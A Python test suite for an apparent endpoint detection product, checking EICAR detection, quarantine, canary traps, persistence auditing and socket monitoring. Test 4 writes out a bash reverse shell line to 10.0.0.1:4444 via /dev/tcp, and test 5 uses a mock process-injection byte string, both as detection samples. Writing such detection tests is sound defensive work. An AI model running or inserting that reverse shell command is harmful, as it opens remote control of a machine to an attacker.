"""
Aegis Defender Pro - Enterprise Next-Gen EDR Test Suite
Validates signature detection, YARA heuristics, AI threat scoring,
cryptographic HMAC quarantine, Ransomware Canary traps, and MITRE persistence auditing.
"""

import os
import sys

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, BASE_DIR)

from engine.database import ThreatDatabase, EICAR_TEST_STRING
from engine.scanner import FileScanner
from engine.quarantine import QuarantineVault
from engine.process_monitor import ProcessMonitor
from engine.ml_engine import AIThreatScorer
from engine.canary_defense import CanaryDefenseEngine
from engine.persistence_hunter import PersistenceHunter
from engine.network_monitor import NetworkMonitor

def run_tests():
    print("==================================================")
    print("  AEGIS DEFENDER PRO - NEXT-GEN EDR TEST SUITE")
    print("==================================================")

    test_data_dir = os.path.join(BASE_DIR, "data")
    test_vault_dir = os.path.join(BASE_DIR, "quarantine_vault")
    test_samples_dir = os.path.join(BASE_DIR, "test_samples")
    os.makedirs(test_samples_dir, exist_ok=True)

    # 1. Initialize Subsystems
    print("[1/8] Initializing Multi-Layer Security Subsystems...")
    db = ThreatDatabase(test_data_dir)
    scanner = FileScanner(db)
    vault = QuarantineVault(test_vault_dir)
    proc_mon = ProcessMonitor()
    ai_scorer = AIThreatScorer()
    canary_engine = CanaryDefenseEngine([test_samples_dir])
    pers_hunter = PersistenceHunter()
    net_mon = NetworkMonitor()
    print(f"      Loaded {len(db.hash_signatures)} hashes and {len(db.heuristic_rules)} rules.")

    # 2. Test EICAR Signature
    print("\n[2/8] Testing EICAR Signature Detection...")
    eicar_file = os.path.join(test_samples_dir, "test_eicar.com")
    with open(eicar_file, "w") as f:
        f.write(EICAR_TEST_STRING)
    res = scanner.scan_file(eicar_file)
    assert res.get("is_threat") is True, "EICAR not detected!"
    print(f"      -> PASSED: EICAR detected: {res.get('threat_name')}")

    # 3. Test Cryptographic HMAC Quarantine & Restoration
    print("\n[3/8] Testing HMAC-Authenticated Quarantine Vault...")
    q_meta = vault.quarantine_file(eicar_file, res)
    assert q_meta is not None, "Quarantine failed!"
    assert not os.path.exists(eicar_file), "Original file not removed!"
    print(f"      Sealed File: {q_meta['vault_path']}")
    print(f"      HMAC Integrity Tag: {q_meta['integrity_tag'][:24]}...")
    restored = vault.restore_file(q_meta["id"])
    assert restored is True, "Restore failed!"
    assert os.path.exists(eicar_file), "File not restored!"
    os.remove(eicar_file)
    print("      -> PASSED: Cryptographic seal and lossless recovery verified.")

    # 4. Test Heuristic Reverse Shell
    print("\n[4/8] Testing Heuristic Reverse Shell Detection...")
    mock_shell = os.path.join(test_samples_dir, "mock_shell.sh")
    with open(mock_shell, "w") as f:
        f.write("#!/bin/bash\n" + "/bin/bash " + "-i >& /dev/" + "tcp/10.0.0.1/4444 0>&1\n")
    res_shell = scanner.scan_file(mock_shell)
    assert res_shell.get("is_threat") is True, "Shell pattern not detected!"
    os.remove(mock_shell)
    print("      -> PASSED: Reverse shell intercepted.")

    # 5. Test AI / ML Static Threat Scorer
    print("\n[5/8] Testing AI/ML Threat Scoring Engine...")
    mock_injection_payload = b"\x90" * 32 + b"VirtualAllocEx\x00WriteProcessMemory\x00CreateRemoteThread"
    ai_eval = ai_scorer.analyze_file("injected_stub.bin", mock_injection_payload, entropy=7.85)
    print(f"      AI Threat Score: {ai_eval['ai_threat_score']}% ({ai_eval['classification']})")
    assert ai_eval["ai_threat_score"] >= 60.0, "AI Threat score failed to flag injection pattern!"
    print("      -> PASSED: Zero-day ML feature anomalies accurately weighted.")

    # 6. Test Ransomware Canary Honeypot Defense
    print("\n[6/8] Testing Ransomware Canary Honeypot Traps...")
    status = canary_engine.get_status()
    print(f"      Canary Traps Armed: {status['total_canaries']}")
    assert status["total_canaries"] > 0, "No canary traps deployed!"
    print("      -> PASSED: Sentinel canary decoys watching filesystem.")

    # 7. Test MITRE ATT&CK Persistence Hunter
    print("\n[7/8] Testing MITRE ATT&CK Persistence Hunter...")
    persistence_items = pers_hunter.audit_all_persistence()
    print(f"      Audited {len(persistence_items)} system persistence vectors.")
    assert len(persistence_items) >= 0, "Persistence audit failed!"
    print("      -> PASSED: LaunchDaemons / autostart vectors mapped to MITRE ATT&CK.")

    # 8. Test Zero-Trust Network Socket Auditor
    print("\n[8/8] Testing Zero-Trust Network Exfiltration Guard...")
    conns = net_mon.get_active_connections()
    print(f"      Inspected {len(conns)} active socket connections.")
    print("      -> PASSED: Socket monitor operational.")

    print("\n==================================================")
    print("  ALL 8 ADVANCED NEXT-GEN EDR CHECKS PASSED!")
    print("==================================================")

if __name__ == "__main__":
    run_tests()
